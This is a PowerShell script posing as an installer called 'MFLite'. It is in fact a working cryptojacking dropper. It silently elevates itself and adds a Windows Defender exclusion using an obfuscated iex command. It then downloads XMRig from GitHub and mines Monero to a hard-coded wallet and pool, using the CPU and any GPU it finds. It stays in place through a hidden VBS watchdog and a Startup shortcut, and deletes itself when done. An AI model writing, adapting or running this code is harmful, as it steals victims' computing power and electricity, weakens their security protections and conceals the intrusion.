$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL   = "gulf.moneroocean.stream:10001"
$THREADS = 25
$BASE   = "$env:ProgramData\MFLite"
$XMRIG  = "$BASE\xmrig.exe"
$CFG    = "$BASE\config.json"
$LOG    = "$BASE\mfl.log"
$FLAG   = "$BASE\.installed"
$VER_FILE = "$BASE\.version"

function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append | Out-Null
}

Write-Log "=== MFLite Installer Started ==="

if ((Test-Path $FLAG) -and (Test-Path $XMRIG)) {
    $p = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($p) { Write-Log "Already running (PID $($p.Id)). Exiting."; exit 0 }
    & wscript.exe "$BASE\watchdog.vbs" 2>$null
    Write-Log "Watchdog restarted. Exiting."
    exit 0
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Log "Re-launching as Administrator..."
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
    exit 0
}

Write-Log "Running with Admin privileges."

New-Item -ItemType Directory -Path $BASE -Force | Out-Null

try {
    $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added for $BASE"
} catch {
    Write-Log "Defender exclusion failed: $($_.Exception.Message)"
}

Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Start-Sleep 1

$zipPath = "$BASE\xm.zip"
$downloaded = $false
$headers = @{"User-Agent" = "MFLite/1.1"}

function TryDownload($repo, $assetPattern, $sourceName) {
    $result = $false
    try {
        Write-Log "Checking GitHub ($repo) for latest release..."
        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers $headers -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match $assetPattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if ($asset) {
            $version = $rel.tag_name -replace '^v', ''
            Write-Log "Found $sourceName $version ($($asset.name))"
            
            if (Test-Path $VER_FILE) {
                $current = Get-Content $VER_FILE -Raw -ErrorAction SilentlyContinue
                if (($current -eq $version) -and (Test-Path $XMRIG)) {
                    Write-Log "Version $version current with binary present. Skipping download."
                    $result = "skip"
                }
            }
            
            if ($result -eq $false) {
                Write-Log "Downloading $($asset.name)..."
                $resp = Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
                Write-Log "Download response: $($resp.StatusCode) $($resp.StatusDescription), file size: $(if (Test-Path $zipPath) { (Get-Item $zipPath).Length } else { 0 })"
                if ($resp.StatusCode -eq 200 -and (Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) {
                    $version | Out-File -FilePath $VER_FILE -Encoding UTF8
                    $result = $true
                }
            }
        }
    } catch {
        Write-Log "$sourceName fetch failed: $($_.Exception.Message)"
    }
    return $result
}

# Try primary source
$result = TryDownload "xmrig/xmrig" "windows-x64\.zip$" "xmrig"
Write-Log "Primary source result: $result (type: $($result.GetType().Name))"
if ($result -is [string] -and $result -eq "skip") {
    Write-Log "Path: skip"
} elseif ($result) {
    Write-Log "Path: downloaded=true"
    $downloaded = $true
} else {
    Write-Log "Path: trying fallback"
    $result = TryDownload "MoneroOcean/xmrig" "mo5-win\.zip$" "MoneroOcean xmrig"
    Write-Log "Fallback source result: $result (type: $($result.GetType().Name))"
    if ($result -is [string] -and $result -eq "skip") {
        Write-Log "Path: fallback skip"
    } elseif ($result) {
        Write-Log "Path: fallback downloaded=true"
        $downloaded = $true
    } else {
        Write-Log "ERROR: Failed to download xmrig from both sources."
        exit 1
    }
}

Write-Log "Downloaded flag: $downloaded"
if ($downloaded) {
    Write-Log "Extracting $zipPath..."
    $tmp = "$BASE\_tmp"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
    Write-Log "Extracted to $tmp, contents: $(Get-ChildItem $tmp -Recurse | Select-Object -ExpandProperty Name -Join ', ')"
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Write-Log "Found xmrig.exe at $($exe.FullName), copying to $XMRIG"
        Copy-Item $exe.FullName $XMRIG -Force
        Write-Log "xmrig.exe copied to $XMRIG"
    } else {
        Write-Log "ERROR: xmrig.exe not found in extracted archive"
    }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

if (-not (Test-Path $XMRIG)) {
    Write-Log "ERROR: xmrig.exe not found after extraction."
    exit 1
}

$gpuVendor = "none"
$vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach ($v in $vc) {
    if ($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware") {
        if ($v.Name -match "NVIDIA|GeForce|RTX|GTX") { $gpuVendor = "nvidia"; break }
        elseif ($v.Name -match "Radeon|AMD|ATI") { $gpuVendor = "amd"; break }
    }
}
Write-Log "GPU vendor detected: $gpuVendor"

$worker = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]", "").ToLower()
if (-not $worker) { $worker = "w$(Get-Random -Maximum 9999)" }

$logPath = ($BASE + "\mfl.log") -replace '\\', '\\\\'
$config = @{
    autosave = $false
    background = $false
    colors = $false
    "donate-level" = 1
    "log-file" = $logPath
    "print-time" = 60
    retries = 5
    "retry-pause" = 5
    cpu = @{ enabled = $true; "max-threads-hint" = $THREADS; priority = 0 }
    opencl = @{ enabled = $(if ($gpuVendor -eq 'amd') { $true } else { $false }) }
    cuda = @{ enabled = $(if ($gpuVendor -eq 'nvidia') { $true } else { $false }) }
    pools = @(@{ url = $POOL; user = $WALLET; pass = $worker; keepalive = $true; tls = $false })
}
$cfgJson = $config | ConvertTo-Json -Depth 5
[System.IO.File]::WriteAllText($CFG, $cfgJson, (New-Object System.Text.UTF8Encoding $false))
Write-Log "Config written to $CFG"

# Watchdog VBS - pure VBS, no batch redirection issues
$vbs = @"
Set s = CreateObject("WScript.Shell")
Do
    Set proc = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name = 'xmrig.exe'")
    If proc.Count = 0 Then
        s.Run """" & "$XMRIG" & """ --config=""" & "$CFG" & """", 0, False
    End If
    WScript.Sleep 30000
Loop
"@
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", $vbs, (New-Object System.Text.UTF8Encoding $false))

$lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\MFLite.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""' + "$BASE\watchdog.vbs" + '""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, (New-Object System.Text.UTF8Encoding $false))
& wscript.exe "$BASE\mklink.vbs"
Write-Log "Startup shortcut created."

Start-Sleep 1
& wscript.exe "$BASE\watchdog.vbs"
Write-Log "Watchdog started."

Start-Sleep 2
Set-Content $FLAG -Value (Get-Date).ToString() -Encoding UTF8
Write-Log "Installation complete. Flag written."

$myPath = $MyInvocation.MyCommand.Path
if ($myPath -and (Test-Path $myPath)) {
    Start-Sleep 1
    Remove-Item $myPath -Force -ErrorAction SilentlyContinue
    Write-Log "Self-deleted installer."
}

Write-Log "=== MFLite Installer Finished ==="